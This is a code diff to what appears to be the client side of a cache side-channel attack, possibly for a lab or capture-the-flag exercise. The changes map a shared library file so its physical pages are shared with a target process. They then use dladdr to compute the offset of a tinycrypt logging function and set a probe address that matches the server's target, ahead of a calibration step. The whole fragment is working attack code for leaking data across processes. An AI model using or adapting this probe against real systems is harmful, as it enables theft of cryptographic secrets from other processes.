@@ -10,6 +10,7 @@
 #include <sys/mman.h>
 #include <fcntl.h>
 #include <sys/stat.h>
+#include <dlfcn.h>
 
 #include "./simple_networking.h"
 #include "./tinycrypt/tinycrypt.h"
@@ -150,14 +151,36 @@ void* map_library_page() {
 }
 
 void init_side_channel() {
-  // Get address of LogError + 10 (like server's target_ptr)
-  g_probe_addr = reinterpret_cast<void*>(
-      reinterpret_cast<uintptr_t>(&tinycrypt::LogError) + 10);
-  std::cout << "[+] Probe address (LogError+10): " << g_probe_addr << std::endl;
-
-  // Also try direct mmap approach
+  // Map the shared library file directly for physical page sharing
   void* mapped = map_library_page();
-  (void)mapped;  // For debugging
+  if (!mapped) {
+    std::cerr << "[-] Failed to map library, falling back to dynamic address" << std::endl;
+    g_probe_addr = reinterpret_cast<void*>(
+        reinterpret_cast<uintptr_t>(&tinycrypt::LogError) + 10);
+    return;
+  }
+
+  // Use dladdr to find the library base address
+  Dl_info info;
+  if (dladdr(reinterpret_cast<void*>(&tinycrypt::LogError), &info) == 0) {
+    std::cerr << "[-] dladdr failed, falling back to dynamic address" << std::endl;
+    g_probe_addr = reinterpret_cast<void*>(
+        reinterpret_cast<uintptr_t>(&tinycrypt::LogError) + 10);
+    return;
+  }
+
+  // Calculate LogError's offset within the library file
+  uintptr_t log_error_addr = reinterpret_cast<uintptr_t>(&tinycrypt::LogError);
+  uintptr_t lib_base = reinterpret_cast<uintptr_t>(info.dli_fbase);
+  uintptr_t offset = log_error_addr - lib_base;
+
+  // Probe the mmap'd address at the same offset (+10 like server's target_ptr)
+  g_probe_addr = reinterpret_cast<void*>(
+      reinterpret_cast<uintptr_t>(mapped) + offset + 10);
+
+  std::cout << "[+] Library base: " << info.dli_fbase << std::endl;
+  std::cout << "[+] LogError offset: 0x" << std::hex << offset << std::dec << std::endl;
+  std::cout << "[+] Probe address (mmap): " << g_probe_addr << std::endl;
 }
 
 void calibrate() {
